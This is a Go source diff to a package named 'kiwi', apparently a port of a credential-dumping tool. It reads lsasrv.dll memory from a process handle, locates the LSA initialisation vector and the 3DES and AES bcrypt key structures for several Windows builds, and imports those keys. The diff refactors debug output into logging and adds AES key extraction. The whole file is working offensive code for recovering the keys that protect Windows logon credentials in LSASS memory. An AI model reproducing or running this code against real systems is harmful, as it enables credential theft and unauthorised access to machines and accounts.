@@ -2,14 +2,12 @@ package kiwi
 
 import (
 	"bytes"
-	"fmt"
 	"runtime"
 	"unsafe"
 
 	"github.com/pkg/errors"
 	"golang.org/x/sys/windows"
 
-	"project/internal/convert"
 	"project/internal/logger"
 	"project/internal/module/windows/api"
 )
@@ -131,7 +129,17 @@ type bcryptHandleKey struct {
 	unknown0 uintptr
 }
 
-type bcryptKey80 struct {
+type bcryptKey struct {
+	size     uint32
+	tag      uint32 // M S S K
+	typ      uint32
+	unknown0 uint32
+	unknown1 uint32
+	unknown2 uint32
+	hardKey  hardKey
+}
+
+type bcryptKey8 struct {
 	size     uint32
 	tag      uint32 // M S S K
 	typ      uint32
@@ -176,7 +184,7 @@ func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
 	memory := make([]byte, lsasrv.size)
 	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
 	if err != nil {
-		return errors.WithMessage(err, "failed to search memory")
+		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
 	}
 	var patches []*patchGeneric
 	switch runtime.GOARCH {
@@ -187,96 +195,116 @@ func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
 	}
 	_, _, build := kiwi.getWindowsVersion()
 	patch := selectGenericPatch(patches, build)
-
-	fmt.Println(patch.minBuild)
-
+	// find special data offset
 	index := bytes.Index(memory, patch.search.data)
-
-	address2 := lsasrv.address + uintptr(index+patch.offsets.off0)
-
-	var offset2 uint32
-	_, err = api.ReadProcessMemory(pHandle, address2, (*byte)(unsafe.Pointer(&offset2)), unsafe.Sizeof(offset2))
+	// read offset about iv
+	address := lsasrv.address + uintptr(index+patch.offsets.off0)
+	var offset uint32
+	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
 	if err != nil {
-		return errors.WithMessage(err, "failed to read iv")
+		return errors.WithMessage(err, "failed to read offset about iv")
 	}
-
-	address2 += 4 + uintptr(offset2)
-
+	// read iv data
+	address += unsafe.Sizeof(offset) + uintptr(offset)
 	iv := make([]byte, 16)
-	_, err = api.ReadProcessMemory(pHandle, address2, &iv[0], uintptr(16))
+	_, err = api.ReadProcessMemory(pHandle, address, &iv[0], uintptr(16))
 	if err != nil {
-		return errors.WithMessage(err, "failed to search iv")
+		return errors.WithMessage(err, "failed to read iv data")
 	}
 	kiwi.iv = iv
-	fmt.Println("IV:", iv)
-
-	address3 := lsasrv.address + uintptr(index+patch.offsets.off1) // TODO off1
-
-	kiwi.nt6RequireKey(pHandle, address3)
-	// address3 = lsasrv.address + uintptr(index) + 16 // TODO off2
-	// kiwi.nt6RequireKey(pHandle, address3)
-
+	kiwi.log(logger.Debug, "iv data:", iv)
+	// acquire 3DES key
+	address = lsasrv.address + uintptr(index+patch.offsets.off1)
+	err = kiwi.acquireNT6LSAKey(pHandle, address, "3DES")
+	if err != nil {
+		return errors.WithMessage(err, "failed to acquire 3DES key")
+	}
+	// acquire AES key
+	address = lsasrv.address + uintptr(index+patch.offsets.off2)
+	err = kiwi.acquireNT6LSAKey(pHandle, address, "AES")
+	if err != nil {
+		return errors.WithMessage(err, "failed to acquire AES key")
+	}
 	kiwi.log(logger.Info, "acquire NT6 LSA keys successfully")
 	return nil
 }
 
-func (kiwi *Kiwi) nt6RequireKey(pHandle windows.Handle, address3 uintptr) error {
-	var offset3 int32
-	_, err := api.ReadProcessMemory(pHandle, address3, (*byte)(unsafe.Pointer(&offset3)), unsafe.Sizeof(offset3))
+func (kiwi *Kiwi) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, alg string) error {
+	const (
+		bhKeyTag = 0x55555552 // U U U R
+		bKeyTag  = 0x4D53534B // M S S K
+	)
+	var offset int32
+	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
 	if err != nil {
-		return errors.WithMessage(err, "failed to search iv")
+		return errors.WithMessage(err, "failed to read offset about bcrypt handle key")
 	}
-	fmt.Println(convert.LEInt32ToBytes(offset3))
-
-	address3 += 4 + uintptr(offset3)
+	address += unsafe.Sizeof(offset) + uintptr(offset)
 	var bhkAddr uintptr
-	_, err = api.ReadProcessMemory(pHandle, address3, (*byte)(unsafe.Pointer(&bhkAddr)), unsafe.Sizeof(bhkAddr))
+	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&bhkAddr)), unsafe.Sizeof(bhkAddr))
 	if err != nil {
-		return errors.WithMessage(err, "failed to search iv")
+		return errors.WithMessage(err, "failed to read address about bcrypt handle key")
 	}
-	fmt.Printf("8, %X\n", bhkAddr)
-
-	var bhk bcryptHandleKey
-	_, err = api.ReadProcessMemory(pHandle, bhkAddr, (*byte)(unsafe.Pointer(&bhk)), unsafe.Sizeof(bhk))
+	var bhKey bcryptHandleKey
+	_, err = api.ReadProcessMemory(pHandle, bhkAddr, (*byte)(unsafe.Pointer(&bhKey)), unsafe.Sizeof(bhKey))
 	if err != nil {
 		return errors.WithMessage(err, "failed to read bcrypt handle key")
 	}
-	fmt.Println(bhk)
-
-	var bk81 bcryptKey81
-	_, err = api.ReadProcessMemory(pHandle, bhk.key, (*byte)(unsafe.Pointer(&bk81)), unsafe.Sizeof(bk81))
+	if bhKey.tag != bhKeyTag {
+		return errors.New("read invalid bcrypt handle key")
+	}
+	// read hard key data
+	_, _, build := kiwi.getWindowsVersion()
+	var (
+		bcryptKeySize   uintptr
+		bcryptKeyOffset uintptr
+	)
+	switch {
+	case build < buildMinWin8:
+		bcryptKeySize = unsafe.Sizeof(bcryptKey{})
+		bcryptKeyOffset = unsafe.Offsetof(bcryptKey{}.hardKey)
+	case build < buildMinWinBlue:
+		bcryptKeySize = unsafe.Sizeof(bcryptKey8{})
+		bcryptKeyOffset = unsafe.Offsetof(bcryptKey8{}.hardKey)
+	default:
+		bcryptKeySize = unsafe.Sizeof(bcryptKey81{})
+		bcryptKeyOffset = unsafe.Offsetof(bcryptKey81{}.hardKey)
+	}
+	bKey := make([]byte, bcryptKeySize)
+	_, err = api.ReadProcessMemory(pHandle, bhKey.key, &bKey[0], bcryptKeySize)
+	if err != nil {
+		return errors.WithMessage(err, "failed to read bcrypt key")
+	}
+	if *(*uint32)(unsafe.Pointer(&bKey[unsafe.Offsetof(bcryptKey{}.tag)])) != bKeyTag {
+		return errors.New("read invalid bcrypt key")
+	}
+	hKey := *(*hardKey)(unsafe.Pointer(&bKey[bcryptKeyOffset]))
+	hardKeyData := make([]byte, int(hKey.secret))
+	address = bhKey.key + bcryptKeyOffset + unsafe.Offsetof(hardKey{}.data)
+	_, err = api.ReadProcessMemory(pHandle, address, &hardKeyData[0], uintptr(len(hardKeyData)))
 	if err != nil {
 		return errors.WithMessage(err, "failed to read bcrypt handle key")
 	}
-	fmt.Println(bk81)
-
-	hardKeyData := make([]byte, int(bk81.hardKey.secret))
-	addr1 := bhk.key + unsafe.Offsetof(bcryptKey81{}.hardKey) + unsafe.Offsetof(hardKey{}.data)
-	_, err = api.ReadProcessMemory(pHandle, addr1, &hardKeyData[0], uintptr(len(hardKeyData)))
+	kiwi.logf(logger.Debug, "%s hard key data: 0x%X", alg, hardKeyData)
+	// open provider
+	algHandle, err := api.BCryptOpenAlgorithmProvider(alg, "", 0)
 	if err != nil {
-		return errors.WithMessage(err, "failed to read bcrypt handle key")
+		return err
 	}
-	fmt.Println("hard key data:", hardKeyData)
-
-	fmt.Println(bhk.size)
-	fmt.Println(bk81.size)
-
-	algHandle, err := api.BCryptOpenAlgorithmProvider("3DES", "", 0)
-	if err != nil {
-		return errors.WithMessage(err, "failed to open bcrypt handle key")
-	}
-
+	// set mode
 	prop := "ChainingMode"
 	mode := windows.StringToUTF16("ChainingModeCBC")
-	err = api.BCryptSetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&mode[0])), uint32(len(mode)), 0)
+	size := uint32(len(mode))
+	err = api.BCryptSetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&mode[0])), size, 0)
 	if err != nil {
-		return errors.WithMessage(err, "failed to set bcrypt handle key")
+		return err
 	}
 	prop = "ObjectLength"
 	var length uint32
-	_, err = api.BCryptGetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&length)), 4, 0)
+	size = uint32(unsafe.Sizeof(length))
+	_, err = api.BCryptGetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&length)), size, 0)
 	if err != nil {
-		return errors.WithMessage(err, "failed to set bcrypt handle key")
+		return err
 	}
 	bk := api.BcryptKey{
 		Provider: algHandle,
@@ -287,7 +315,11 @@ func (kiwi *Kiwi) nt6RequireKey(pHandle windows.Handle, address3 uintptr) error 
 	if err != nil {
 		return err
 	}
-	kiwi.key3DES = &bk
-
+	switch alg {
+	case "3DES":
+		kiwi.key3DES = &bk
+	case "AES":
+		kiwi.keyAES = &bk
+	}
 	return nil
 }
